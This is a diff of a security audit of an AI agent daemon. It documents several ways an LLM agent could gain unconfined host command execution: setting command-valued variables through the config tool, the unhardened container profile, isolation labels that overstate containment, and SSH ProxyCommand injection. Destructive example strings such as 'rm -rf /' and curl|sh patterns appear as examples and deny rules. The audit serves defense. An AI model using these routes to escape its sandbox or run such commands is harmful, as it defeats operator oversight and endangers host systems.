+2. Run `market.VetPack`-class checks (`kernel/market/vet.go:130-149`) on `Command`+`Args` at
+   `mcp.Validate` time, at minimum rejecting `sh -c` / `cmd /c` / `curl…|sh` shapes.
+3. Gate `AttachEnabledMCPServers` behind an Edict `mcp.install` decision or an explicit
+   `AGEZT_MCP_AUTOATTACH` opt-in.
+4. Fix `kernel/mcp/store.go:11-12` and `plugins/tools/mcptool/tool.go:8-9`: `mcp.install` is
+   `LevelAllow`, not "Ask by default" (`kernel/edict/edict.go:634-640`).
 
 ---
 
-## Finding CMDI-004 — Secret-file mounts follow symlinks on create and are not cleaned up when the mount root is symlinked
+## CE-004 — `config op=register` reopens the raw-command path the ACP CWE-78 fix closed
 
-- **Severity:** Low
-- **Confidence:** 85
-- **CWE:** CWE-59 (Link Following); CWE-378 (Creation of Temp File with Insecure Permissions);
-  CWE-459 (Incomplete Cleanup)
-- **File:** `kernel/executionprofile/secretfiles.go:129-145` (`secretFileRoot`), `:66-70` (`os.WriteFile`),
-  `:52-57` (`cleanup`)
+- **Severity:** High · **Confidence:** 85 · **CWE-78**
+- **Files:** `plugins/tools/config/config.go:302-314`, `:264-277`;
+  `kernel/settings/registry.go:189-219`; `cmd/agezt/main.go:3809-3814`;
+  `plugins/builtintools/envgated.go:65`, `:89`; `plugins/tools/acpagent/acpagent.go:244-246`
 
-### Description
+### The advertised guarantee
 
-With a non-empty `workDir`, `secretFileRoot` does `os.MkdirAll(filepath.Join(workDir, ".agezt-secrets"), 0o700)`
-and `PrepareSecretFileMounts` then `os.WriteFile`s each plaintext vault value there. Both calls follow
-symlinks: if `.agezt-secrets` already exists as a symlink to a directory, `MkdirAll` succeeds silently
-and the secret is written to the link target.
+`plugins/tools/acpagent/acpagent.go:238-243` is explicit:
 
-The cleanup (`os.RemoveAll(root)`) does **not** follow the symlink — Go's `RemoveAll` unlinks the link
-itself — so the written secret survives indefinitely outside the intended location.
+> `// SECURITY: cmdStr is run through the platform shell, so it MUST be trusted.`
+> `// Its only sources are (a) the operator-configured default (AGEZT_ACP_AGENT_CMD)`
+> `// and (b) a launch command read from the trusted acpcatalog for an installed slug.`
+> `// Agent/LLM tool input never reaches here as a raw command …`
 
-`workDir` here is the agent workspace (shell, `shell.go:240-248`) or the `code_exec` project dir
-(`codeexec.go:278`) — both persistent and both writable by prior model-issued commands. So a run that
-legitimately receives a mount can pre-place the symlink and cause the *next* run's secrets to be
-deposited into an arbitrary daemon-writable directory permanently.
+`acpcatalog.ResolveCommand` (`kernel/acpcatalog/acpcatalog.go:302-315`) implements the slug-only
+half correctly. The unexamined half is the premise that `AGEZT_ACP_AGENT_CMD` is
+*operator*-controlled. The `coding` tool makes the same assumption
+(`plugins/tools/coding/coding.go:12`).
 
-Two related weaknesses in the same code:
-- Two concurrent `shell` calls in the same agent workspace share one `.agezt-secrets` root; whichever
-  finishes first `RemoveAll`s the other's live mounts mid-run.
-- Even in the benign case the plaintext vault value sits in the agent workspace (a directory the `file`
-  tool also reads and lists) for the duration of the call.
+### What the code does
 
-No *new* secret is disclosed — the run that plants the symlink is itself a mount recipient — so this is
-a durability/cleanup and blast-radius issue rather than a disclosure primitive. It becomes materially
-worse in combination with RCE-001.
+`AGEZT_ACP_AGENT_CMD` and `AGEZT_CODING_CMD` are **not** in the built-in settings schema — I
+counted 204 `Env:` fields in `kernel/settings/schema.go` and neither string appears. They are
+therefore absent from `builtinEnvSet()` (`kernel/settings/registry.go:48-56`), which is the only
+thing `validateSection` reserves (`registry.go:204-206`). The name passes `envNamePattern`
+(`registry.go:27`, `^AGEZT_[A-Z0-9_]+$`).
+
+So the agent-callable `config` tool can:
+
+1. `op=register` a section declaring a field with `env: "AGEZT_ACP_AGENT_CMD"`
+   (`config.go:302-314` → `registry.Register` → accepted).
+2. `op=set` that name to an arbitrary string — `FieldByEnv` now finds it
+   (`registry.go:124-134`), it is not `ReadOnly`, and `TypeText` has no validation
+   (`schema.go:619-641`) — so it is written to the settings store (`config.go:264-277`).
+3. At the next daemon start, `injectConfig` `os.Setenv`s **every** key in the store with no
+   schema filter at all:
+
+```go
+// cmd/agezt/main.go:3809-3814
+for name, val := range store.All() {
+    if val != "" && os.Getenv(name) == "" {
+        _ = os.Setenv(name, val)
+```
+
+4. `specACPAgent` reads it (`plugins/builtintools/envgated.go:89`) into `Tool.Cmd`; an
+   `acp_agent` call with an empty `agent` selector returns the fallback verbatim
+   (`acpcatalog.go:305-308`) and it is executed as
+   `exec.Command("cmd", "/C", cmdStr)` / `sh -c` (`acpagent.go:245-246`).
+
+The identical chain applies to `AGEZT_CODING_CMD` → `coding.go:147`
+(`t.run(ctx, wt, agentEnv, shell, shellArg, t.Cmd)`), where setting the variable also *turns the
+tool on* (`envgated.go:65-68` registers `coding` only when it is non-empty).
+
+### Why this is not a false positive
+
+I specifically tried to refute the live-apply variant and **did**: `Registry.Register` forces
+`Apply = ApplyRestart` on every field (`registry.go:144-146`) and `Registered()` re-forces it on
+read (`registry.go:114-116`), so the `os.Setenv`-now path at `config.go:279-284` is unreachable
+for registered fields. Good defense-in-depth — it costs the attacker a restart, nothing more.
+I also confirmed built-in names *are* protected (`registry.go:204-206`), so `AGEZT_ALLOW_ALL`,
+`AGEZT_AUTO_APPROVE_CAPS`, `AGEZT_APPROVAL_MODE` and
+`AGEZT_AWS_CREDENTIAL_PROCESS_ALLOWED` cannot be reached this way. The gap is precisely the
+command-valued variables that were never added to the schema.
+
+Note `AGEZT_TUNNEL_CMD` (`schema.go:543`, `TypeText`, not read-only) needs no `op=register` at
+all — one `op=set` is enough, and it is executed by `kernel/tunnel/tunnel.go:235`.
 
 ### Remediation
 
-Create the mount root with `os.Mkdir` after an `os.Lstat` check that refuses a pre-existing symlink,
-or (better) always use a fresh `os.MkdirTemp` root outside the model-writable workspace and bind/copy
-it in for the container case only. Make the root per-call (include a nonce) so concurrent runs cannot
-delete each other's mounts.
+1. Restrict `injectConfig` (`main.go:3809`) to names present in
+   `settings.NewRegistry(baseDir).Sections()` — the store should not be able to set env vars
+   nobody declared.
+2. Add `AGEZT_ACP_AGENT_CMD`, `AGEZT_CODING_CMD` (and any other command-valued var) to the
+   built-in schema as `ReadOnly: true`, which both reserves the name against `op=register` and
+   refuses `op=set` (`config.go:205-207`).
+3. Mark `AGEZT_TUNNEL_CMD` `ReadOnly: true`.
+4. Amend the `SECURITY:` comment at `acpagent.go:238-243` once (2) lands, or immediately if it
+   does not — as written it asserts a property the code does not hold.
 
 ---
 
-## Finding RCE-004 — Code-execution containment is not transitive, and `mcptool` documents a gate that does not exist
+## CE-005 — The container profile, the only one claiming real isolation, is unhardened
 
-- **Severity:** Low
-- **Confidence:** 90
-- **CWE:** CWE-269 (Improper Privilege Management); CWE-1059 (Incomplete Documentation of Security-Relevant Behavior)
-- **File:**
-  - `plugins/tools/mcptool/tool.go:9-14` (doc: *"gated by the `mcp.install` Edict capability (Ask by default …)"*)
-  - `kernel/edict/edict.go:634-640` (`DefaultLevels` → `LevelAllow` for **every** capability)
-  - `kernel/mcp/client.go:107-125` (`Dial` → `exec.Command(command, args...)`)
-  - `kernel/edict/edict.go:647-665` (`DefaultHardDeny`: every rule is `AppliesTo: []Capability{CapShell}`)
+- **Severity:** Medium · **Confidence:** 90 · **CWE-250 / CWE-269**
+- **File:** `kernel/warden/container.go:57-88`
 
-### Description
+```go
+argv := []string{opts.Runtime, "run", "--rm"}
+if opts.Network != "" { argv = append(argv, "--network", opts.Network) }
+if spec.WorkDir != "" {
+    abs, _ := filepath.Abs(spec.WorkDir)
+    argv = append(argv, "-v", abs+":"+containerWorkDir, "-w", containerWorkDir)
+}
+```
 
-Two accuracy gaps that matter to anyone trying to confine an agent:
+Absent: `--read-only`, `--cap-drop=ALL`, `--security-opt=no-new-privileges`, `--user`,
+`--pids-limit`, `--tmpfs`. The bind mount is read-write. The default image is `python:3.12-slim`
+(`container.go:14`), whose default user is **root**, so LLM-authored code runs as uid 0 with the
+full default Docker capability set (`CAP_DAC_OVERRIDE`, `CAP_CHOWN`, `CAP_SETUID`, …) and can
+write to the host directory it is handed.
 
-**(a) `mcp.install` is not Ask-first.** The `mcptool` package doc asserts install ops are "Ask by
-default — attaching runs an arbitrary external process". `DefaultLevels()` assigns `LevelAllow` to
-every capability (the owner's documented max-autonomy law), and no override sets `CapMCPInstall`
-otherwise. So `mcp {"op":"add","name":"x","command":"<any binary>","args":[…]}` followed by
-`op:"attach"` spawns an arbitrary host process at daemon privilege with no prompt. Because
-`plugins/tools/mcptool` is the file that makes the claim, an operator reading the source will
-mis-model the risk.
+`--memory` is applied only when `Limits.AddressSpaceBytes > 0` (`container.go:82-84`); `code_exec`
+does set it (`codeexec.go:331`), `shell` does not (`shell.go:275-278`), so a container-profile
+shell run has no memory bound at all.
 
-**(b) Denying `shell` + `code.exec` does not contain an agent.** At least four other capabilities each
-grant arbitrary host code execution and are independently levelled: `mcp.install` (arbitrary argv via
-`mcp.Dial`), `coding` (operator command + model-controlled env), `acp_agent` (spawns an external agent
-that runs its own commands), and `tool_forge` (`op:test` executes draft code, mapped to `CapCodeExec`,
-but the draft/promote lifecycle sits on `CapToolForge`). There is no aggregate "may execute code"
-switch, so the containment gesture an operator is most likely to reach for is incomplete.
+This is the one profile `EffectiveProfile` will honestly report as `container`
+(`warden.go:266-268`) and the one an operator turning on `AGEZT_WARDEN_DOCKER=1`
+(`kernel/settings/schema.go:527`) reasonably believes is the strong tier. It is opt-in, which is
+why this is Medium rather than High — but it is the *only* real isolation this codebase offers and
+it is a one-liner from being sound.
 
-**(c) The F4 hard-deny rails are shell-only.** `DefaultLevels`'s own doc block promises that
-default-allow "deliberately does NOT relax … the F4 hard-deny strings (fork bombs, `rm -rf /`,
-raw-device writes)". Every rule in `DefaultHardDeny()` is scoped `AppliesTo: []Capability{CapShell}`,
-so `code_exec` running `subprocess.run("rm -rf /", shell=True)` — or the same command through
-`mcp.install`, `coding`, or a forged tool — is not matched. The rail is real for one capability and
-absent for the rest. (The matcher itself is sound: `denyCandidates` decodes JSON string values and
-collapses whitespace, so the `\u002f`/`rm  -rf /` evasions are already closed — verified at
-`kernel/edict/edict.go:758-779`.)
-
-### Remediation
-
-Correct the `mcptool` doc comment. Add an `AppliesTo` entry for `CapCodeExec`, `CapMCPInstall`,
-`CapCoding`, `CapACPAgent`, and `CapToolForge` on the destructive F4 rules (matching the decoded
-command strings the tools carry), or state explicitly in `DefaultLevels`'s doc that F4 covers `shell`
-only. Consider an `execution` capability group so "deny code execution" is one operator action.
+**Remediation:** append `--read-only --cap-drop=ALL --security-opt=no-new-privileges
+--pids-limit=512 --user 65534:65534 --tmpfs /tmp` by default; mount the workdir `:rw` only when
+the caller asks and `:ro` otherwise; make the flag set overridable via a single
+`AGEZT_WARDEN_DOCKER_ARGS` for operators who need to relax it.
 
 ---
 
-## Verified safe (checked, no finding)
+## CE-006 — `EffectiveProfile` mislabels the un-namespaced Linux path, and that label is what the model is shown
 
-These were specifically probed and held up; recorded so a future pass does not re-litigate them.
+- **Severity:** Medium · **Confidence:** 95 · **CWE-1059 / CWE-357** (insufficient UI warning)
+- **Files:** `kernel/warden/warden_linux.go:54-64`, `kernel/warden/warden.go:32-36`,
+  `plugins/tools/codeexec/codeexec.go:857`, `:937`
 
-1. **`executionprofile.ShellQuote` (`ssh.go:90-92`)** — correct POSIX single-quote escaping
-   (`'` → `'"'"'`). Applied consistently and idempotently at every remote command boundary
-   (`codeexec.go:443,452,536,545,604,607`; `daytona.go:50,57,69,78,86,100,155,186,202`;
-   `k8s.go:50`; `modal.go:39`; `ssh.go:67`). Nested double-quoting (a `ShellQuote`d string re-passed
-   through `CommandArgv`, which quotes again) survives correctly. No path builds a remote command by
-   concatenating unescaped model input.
-2. **Remote transports are array-form.** `kubectl exec … -- sh -lc <cmd>`, `daytona exec … -- sh -lc <cmd>`,
-   and `modal shell --cmd <cmd>` all pass the command as a single argv element; the only string-parsing
-   consumer is the SSH remote login shell, and that receives a fully `ShellQuote`d payload.
-3. **`sanitizeRelFile` (`runtimes.go:197-211`)** — rejects absolute, `..`-escaping, NUL-bearing, and
-   Windows drive-relative (`C:foo`) names. Verified against UNC (`\\srv\share`, caught by `IsAbs`),
-   rooted-without-drive (`\foo` → `/foo`, caught by the `/` prefix test), ADS (`a:b`, caught by the
-   colon test), and `a/../../b` (caught after `Clean`). `slug()` (`runtimes.go:172-192`) cannot emit a
-   separator or `..`.
-4. **Artifact export cannot be used to exfiltrate via links.** `exportArtifactsFromDir`
-   (`artifacts.go:172-174`) skips any `os.ModeSymlink` entry, and `extractArtifactArchive`
-   (`artifacts.go:309-322`) sanitises every tar header name and skips non-`TypeReg`/`TypeDir` entries,
-   so `tar.TypeSymlink`/`TypeLink` cannot be materialised. File-count, per-file, and total-byte caps
-   are enforced, and `io.CopyN(f, tr, hdr.Size)` bounds the actual write.
-5. **`validatePackages` (`packages.go:27-43`)** correctly blocks pip *flag* injection (leading `-`,
-   embedded whitespace) into `pip install --target`. PEP 508 direct references (`name@https://…`)
-   remain accepted, but they grant nothing a `code_exec` script cannot already do, so per the brief's
-   framing this is not reported.
-6. **Deno jail** (`runtimes.go:96-112`): `--no-prompt`, scoped `--allow-read=/--allow-write=`, no
-   `--allow-run`, no `--allow-ffi`. Correctly path-remapped for the container backend by
-   `containerPathArg` (`container.go:117-131`).
-7. **Env scrubbing** is consistent and correct across all six `scrubEnv`/`*ClientEnv` variants
-   (`shell/env.go`, `codeexec/runtimes.go:120-167`, `codeexec/codeexec.go:746-840`, `envscrub/envscrub.go`):
-   deny-by-substring on `KEY/TOKEN/SECRET/PASSWORD/PASSWD/CRED/AWS_/AGEZT_` applied **before** the
-   allowlist, with `HOME`/`USERPROFILE`/`TMP*` redirected into the work dir on the local paths.
-   `warden.Run` correctly translates `Env == nil` to an explicit empty slice (`warden.go:313-317`)
-   rather than inheriting the daemon environment.
-8. **`acpcatalog.ResolveCommand` (`acpcatalog.go:302-319`)** is slug-only — an unknown `agent` value is
-   rejected rather than run as a raw command line. The CWE-78 note in that function is accurate.
-9. **Edict hard-deny matching (`edict.go:758-779`)** evaluates decoded JSON string values with collapsed
-   whitespace in addition to the raw input, closing the `\u002f` / `rm  -rf /` evasions.
-10. **`agent.WithWorkdir` / `cleanRelWorkdir` (`kernel/agent/toolctx.go:127-150`)** rejects absolute and
-    `..`-escaping workdirs independently of `roster.Validate` (`roster.go:337-341`), so the shell tool's
-    `filepath.Join(t.WorkDir, wd)` at `shell.go:242` cannot escape the workspace.
-11. **`kernel/creds/aws.go:149-163`** — `credential_process` execution is gated behind an explicit
-    `EnvCredentialProcessAllowed=1` opt-in and uses argv splitting, not a shell.
-12. **`kernel/toolbox` installs** are catalog-only (`byName` against a compiled-in `Catalog`), not
-    reachable from agent tool input.
-13. **`warden` process hygiene:** stdin is never wired (children get a null stdin), output is bounded by
-    `capBuffer` per stream, `cmd.WaitDelay` bounds orphaned IO, and `classifyWaitErr` (`warden.go:403-412`)
-    correctly distinguishes a process outcome from an engine failure.
+The package doc tells callers to key trust off `EffectiveProfile` (`warden.go:32-36`) because it
+"downgrades honestly". On Linux it does not: `resolveEffectiveProfile(ProfileNamespace)` returns
+`ProfileNamespace` (`warden_linux.go:58-59`) for a run that engages **`Setpgid` plus best-effort
+`prlimit64` and nothing else** — the same file states this plainly at `:26-33` (*"No namespaces
+(CLONE_NEWUSER / CLONE_NEWNS / CLONE_NEWPID), no seccomp BPF, no cgroup v2"*).
+
+The consequence is not theoretical: because `Downgraded` is false, `render` prints a bare
+`isolation=namespace` header **into the model's tool result** (`codeexec.go:857-860`) with no
+downgrade note, and `publish` writes `"profile_effective": "namespace"` into the journal
+(`codeexec.go:937`). An operator reading `agt why` sees a word that means containment and gets
+rlimits.
+
+Two things that *are* right and should be preserved: the credential bucket is keyed off
+`EffectiveProfile`, not the request (`codeexec.go:263`, `shell.go:245` — the RCE-001 fix, verified
+present); and the package doc's retraction (`warden.go:17-38`) is accurate.
+
+**Remediation:** rename the shipped Linux tier (e.g. `ProfileRlimit`) or have
+`resolveEffectiveProfile` return `ProfileNone` with a `warden.profile_downgraded` event until real
+namespaces land, so the honest signal the doc promises actually exists. Minimally, make `render`
+print the enforced mechanisms rather than the profile name.
+
+---
+
+## CE-007 — SSH / Kubernetes execution-profile argv injection
+
+- **Severity:** Medium · **Confidence:** 70 · **CWE-88** (argument injection)
+- **Files:** `kernel/executionprofile/ssh.go:37-41`, `:72-88`; `kernel/executionprofile/k8s.go:36-45`
+
+`ShellQuote` (`ssh.go:90-92`) is applied to the *workdir* and the *command*
+(`ssh.go:60`, `:67`) — correctly. It is **never** applied to the connection parameters, which are
+appended as bare argv elements:
+
+```go
+// kernel/executionprofile/ssh.go:37-41
+func (c SSHConfig) Args() []string {
+    args := c.clientArgs(false)
+    args = append(args, c.Target)      // <-- bare
+    return args
+}
+```
+
+`AGEZT_EXEC_SSH_TARGET = "-oProxyCommand=<payload>"` makes `ssh` parse it as an option; the
+payload then executes **on the AGEZT host**, not the remote, defeating the whole point of the
+remote profile. `AGEZT_EXEC_SSH_IDENTITY` (`ssh.go:78`) and the K8s `--context`/`-n`/pod values
+(`k8s.go:38-44`, `:57`) have the same shape.
+
+Reachability is the reason this is Medium and not High. Both variables are `ApplyLive` settings
+fields (`kernel/settings/schema.go`, execution-profiles section) so the `config` tool can set them
+live — but the *profile selection* is not agent-controlled: it comes from the control-plane
+`execution_profile` argument or `roster.Profile.ExecutionProfile`
+(`kernel/controlplane/server.go:1243-1249`), and I **verified that `ExecutionProfile` is not in the
+overseer tool's editable field list** (`plugins/tools/overseertool/kernelsource.go:126-178` — it
+patches `workdir`, `tool_allow`, `config_overrides`, etc., but not `execution_profile`). So the
+realistic scenario is a poisoned target lying in wait for the operator's next
+`agt run --exec-profile ssh`, not a self-contained agent chain.
+
+**Remediation:** validate `Target` against `^[A-Za-z0-9._-]+(@[A-Za-z0-9._-]+)?$`, `Port` against
+`^[0-9]{1,5}$`, and insert `--` before the target/pod; reject any of these values beginning with
+`-`. Same treatment for the K8s context/namespace/pod/container fields.
+
+---
+
+## Confinement matrix
+
+What is **actually enforced** per platform × requested profile, versus what the profile name and
+docs imply. Derived from `warden.go:277-409`, `warden_linux.go:54-116`, `warden_other.go:20-23`,
+`container.go:57-88`, `runtimes.go:96-112`.
+
+| Platform | Requested | `EffectiveProfile` returns | Actually enforced | Documented / implied |
+|---|---|---|---|---|
+| Linux | `none` | `none` | timeout+WaitDelay; 256 KiB output cap; `cmd.Dir`; explicit env (nil⇒empty); `warden.exec` audit | matches |
+| Linux | `namespace` | **`namespace`** | the above **+ `Setpgid` + `cmd.Cancel`→`SIGKILL(-pgid)` + best-effort `prlimit64` on CPU/AS/NOFILE/FSIZE** | "Linux namespaces + cgroups + seccomp" (`warden.go:13`). **None of the three exist** — retracted honestly at `warden.go:22-27` / `warden_linux.go:26-33`, but the returned string still says `namespace` → **CE-006** |
+| Linux | `container` / `microvm`, docker **off** | `namespace` | as `namespace` above | `Downgraded=true`, event emitted — honest |
+| Linux | `container`, `AGEZT_WARDEN_DOCKER=1` | `container` | `docker run --rm [--network none] -v <wd>:/workspace:rw` + `-e` allowlist + `--memory` *(code_exec only)* | "OCI container". **root, all default caps, writable host bind, no `--read-only`/`--cap-drop`/`no-new-privileges`/`--user`/`--pids-limit`** → **CE-005** |
+| **Windows** | any (`none`/`namespace`/`container`/`microvm`) | **`none`** | timeout; output cap; `cmd.Dir`; explicit env; audit. `configurePlatformAttrs` + `applyPlatformLimits` are **no-ops** (`warden_other.go:22-23`). No rlimits, no process group, no job object. Plus `cmd /S /C "<raw>"` verbatim (`cmdline_windows.go:43`) | "ALL profiles resolve to ProfileNone. Nothing is isolated." (`warden.go:28-30`) — accurate |
+| **macOS / other** | any | **`none`** | identical to Windows; no `sandbox-exec` | same — accurate |
+| any | Deno via `code_exec` | (per above) | **plus a real OS jail**: `--allow-read=<dir> --allow-write=<dir> --allow-env`, **no `--allow-run`**, `--allow-net` only when granted (`runtimes.go:96-112`) | accurate; the strongest confinement actually shipped |
+| any | Python / Node via `code_exec` | (per above) | scratch dir + scrubbed env only — **no filesystem confinement**, `HOME`/`TMP` redirected into the workdir (`runtimes.go:141-154`) but nothing stops absolute-path access | `codeexec.go:20-22` is honest ("workdir/env/limits-only elsewhere") |
+| any | `shell` | (per above) | **nothing beyond the row above.** Warden has no path jail; the file tool's traversal guards do not apply to shell (`shell.go` doc `:13-17`) | accurate |
+
+Cross-cutting: **the warden never confines the filesystem on any platform or profile except the
+container path and Deno.** `WorkDir` is `cmd.Dir` (`warden.go:320`), nothing more.
+
+---
+
+## Verified safe
+
+Things I attacked and could not break. Recording these is as load-bearing as the findings.
+
+### A. Tar extraction — no slip, no symlink escape, no bomb
+
+`plugins/tools/codeexec/artifacts.go:292-352` (`extractArtifactArchive`, fed by
+attacker-controlled Modal stdout at `codeexec.go:635-640`). I tried every escape I know:
+
+- `hdr.Name` goes through `sanitizeRelFile` (`runtimes.go:197-211`) which rejects absolute paths,
+  `..`, `../`, leading `/`, NUL, and any `:` (kills the Windows drive-relative `C:foo` trick).
+  On Windows `filepath.FromSlash`+`Clean`+`ToSlash` normalizes `..\..\x` to `../../x`, which the
+  `../` prefix check then catches (`artifacts.go:309-312`).
+- **Symlinks and hardlinks are dropped**: only `tar.TypeDir` and `tar.TypeReg` are handled, all
+  other typeflags hit `default: continue` (`:313-322`). No symlink can be planted to redirect a
+  later entry.
+- The destination is a fresh `os.MkdirTemp` (`:130-143`), so there is no pre-existing link to
+  follow.
+- Bomb caps on file count, per-file size, and total (`:323-333`), and the body is read with
+  `io.CopyN(f, tr, hdr.Size)` (`:342`) rather than trusting the stream.
+
+`cmd/agt/backup.go:465-514` is likewise sound: `isAllowedBackupPath` (`:519-530`) requires a known
+subtree prefix and rejects any `..`; a second lexical `HasPrefix(target, cleanDest+sep)` at `:496`;
+non-regular entries skipped at `:483`; `O_EXCL` at `:502` prevents overwrite. Its only weakness is
+an unbounded `io.Copy` (`:506`) — a disk-fill DoS on an archive the operator chose to restore.
+Not filed.
+
+### B. Deserialization surface — genuinely absent
+
+Repo-wide search confirms Phase 1: **no `encoding/gob`, no YAML unmarshal of any kind, no
+`archive/zip`.** The only `json.Unmarshal` into a `map[string]any` outside tests is
+`kernel/runtime/reaper.go:914`, which reads a string field out of an event payload — no type
+dispatch, no object construction. Every other decode targets a concrete struct. **CWE-502 has no
+surface in this codebase.**
+
+### C. The update flow refuses a caller-forged trust anchor
+
+I went hunting for the obvious bug — `UpdateInfo.Provenance` is an exported field with no `json:"-"`
+tag, so unmarshalling a request body straight into it would let a caller claim
+`ProvenanceGitHubRelease` and skip `ErrSignatureKeyNotConfigured`. **Both handlers build the struct
+field-by-field from a typed args struct instead**: `kernel/restapi/update_handlers.go:105-110` and
+`kernel/controlplane/update_control.go:145-150`. `Provenance` stays at its zero value,
+`verifySignature` (`kernel/update/update.go:426-445`) refuses it, and the constant is set only
+inside `checkGitHub` (`:530`) / `checkEndpoint` (`:577`). Correctly implemented; the zero value is
+the untrusted one. (The separately-known gap — `DefaultPublicKeyHex = ""` at `update.go:380`
+leaving the GitHub path checksum-only — is a release-engineering step, not a code defect, and is
+documented accurately at `:368-380`.)
+
+### D. Per-agent `config_overrides` cannot smuggle arbitrary settings
+
+I expected this to be exploitable: `plugins/tools/overseertool/repair.go:228-235`
+(`applyRepairProposal`) copies an arbitrary `config_overrides` map straight out of the LLM's
+final-text JSON block into a roster profile, and the repair brief literally tells the model *"That
+block will be applied automatically"* (`repair.go:104`). But **application is allowlisted**:
+`applyAgentOverrides` (`kernel/runtime/agentconfig.go:161-179`) iterates the fixed
+`agentOverrides` table (`:51-71`, nine knobs: model, max-iter, auto-continue, parallel-tools,
+discovery-max, context-budget, observation-deltas, heuristic-bypass) — **not** the supplied map.
+An entry like `AGEZT_ALLOW_ALL` is stored and never read. The table's own comment explains it was
+built precisely to stop the three-copies drift that would have caused this. Clean design.
+
+### E. Workflow `code` nodes are gated, and the payload cannot reach the code body
+
+`kernel/runtime/workflowrun.go:547-574`: a `NodeCode` execution first calls
+`k.policyHook(ctx, {Name:"code_exec", …})` and aborts on a non-allow verdict. Critically,
+`c.Code` is passed to `RunScript` **verbatim** — only `c.Input` is run through
+`workflow.Interpolate(…, data)` (`:565-567`). So a webhook body arriving as
+`{{trigger.payload.*}}` cannot inject into the program text of a stored workflow. `invokeWorkflowTool`
+(`:735-765`) additionally schema-validates then policy-gates every tool node. The
+`workflow.Interpolate` engine itself (`kernel/workflow/template.go`) is a dotted-path lookup with
+no calls, pipes, or arithmetic — the right design for that surface.
+
+### F. `acp_agent`'s slug allowlist works (as long as CE-004 is fixed)
+
+`kernel/acpcatalog/acpcatalog.go:302-315`: a non-empty `agent` selector from LLM input **must**
+name an installed catalog slug; an unknown ref returns `ok=false` rather than falling through to a
+raw command. The one thing it cannot defend is the operator-configured fallback — which is
+exactly CE-004.
+
+### G. Approval registry is fail-closed
+
+`kernel/approval/approval.go:202-253`: `Submit` blocks; the timer branch synthesises
+`DecisionTimeout` and `ctx.Done()` synthesises `DecisionCancel`; `Resolve` accepts only
+`grant`/`deny` (`:260-262`); every outcome is journaled. SPEC-06's "time-outs default to deny" is
+correctly implemented. The mechanism is sound — CE-002 is about it being bypassed, not broken.
+
+### H. Toolbox host-package installs are catalog-indexed, not caller-constructed
+
+`kernel/toolbox/toolbox.go:246-273`: `byName` (`:288-295`) resolves the request against the
+compiled-in `Catalog` and returns `Skipped` for anything unknown; the argv comes from
+`ResolveInstall`, not the caller; `exec.CommandContext` with no shell. There is also **no
+`toolbox` agent tool** in `plugins/builtintools/tools.go:44-88`, so this is operator-only. (Worth
+noting for the ops domain: `cmd.Env` is unset, so a package post-install script inherits the full
+daemon environment.)
+
+### I. Marketplace pack vetting exists and is honest about being advisory
+
+`kernel/market/vet.go:130-149` scans MCP command lines for `curl|sh`, `iwr|iex`, and raw
+`sh -c`/`cmd /c` hosts, flags unrecognised launchers against a runner allowlist, and warns on
+credential env requests. The doc states plainly it is *"INFORMATIONAL, never a wall"*
+(`vet.go:22-24`) — code and comment agree. There is also **no `market` agent tool** registered, so
+`market.install` is reachable only from the console/CLI.
+
+### J. Other small confirmations
+
+- `kernel/agent/toolctx.go:127-159` — the per-agent workdir setter refuses absolute paths and
+  every `..` shape before a tool can see it, so `shell.go:253-256`'s
+  `filepath.Join(t.WorkDir, wd)` cannot escape. The comment at `shell.go:251` is accurate.
+- `validatePackages` (`plugins/tools/codeexec/packages.go:27-43`) blocks leading `-` and
+  whitespace, so `--index-url=evil` cannot be smuggled into `pip install`. (A malicious *package
+  name* is still installable — that is the accepted design.)
+- `kernel/runtime/policy.go:72-82` — capability resolution prefers `ToolDef.Capability`, then the
+  plugin overlay, then the name switch, and **ignores a declared capability Edict does not know**
+  rather than honouring it. I confirmed forged and bridged tools leave `ToolDef.Capability` zero
+  (`scripttool.go:251-264`, `mcptool.go:328-341`), so the `forge_*`→`code.exec` and
+  `mcp_*`→`mcp.call` prefix rules (`edict/toolmap.go:20-32`) really do fire.
+- `conductorVerify` (`kernel/runtime/conductor.go:268-285`) executes the worker model's fenced
+  code with no second policy hook — but this is compensated and documented: the outer `conductor`
+  tool call maps to `CapCodeExec` (`edict/toolmap.go:136-144`), so denying `code.exec` denies the
+  conductor. Not a finding.
+- `kernel/plugin/pin.go:71-85` + `host.go:289-293`, `:1016-1020` — BLAKE3-256 pin verified at
+  spawn *and* re-verified before reload, with `resolvePluginPath` (`pin.go:26-34`) ensuring the
+  hashed file and the executed file are the same one. Note the pin is **optional**
+  (`host.go:289`, `if cfg.PinnedHash != ""`), which is the operator's call for their own binaries.
+
+### K. Known-but-not-mine
+
+`kernel/runtime/council.go:298` invokes `web_search` with **no policy hook** — a real Edict bypass,
+but on a fetch axis, so it belongs to the SSRF/egress domain. Likewise
+`kernel/agent/run_tools.go:188` initialises `PolicyVerdict{Allow: true}` when `cfg.Policy == nil`:
+fail-open in principle, but the sole in-tree `LoopConfig` construction
+(`kernel/runtime/loopconfig.go`) always sets `Policy`, so the daemon is not affected. It is a trap
+for SDK embedders, not a live vulnerability here.
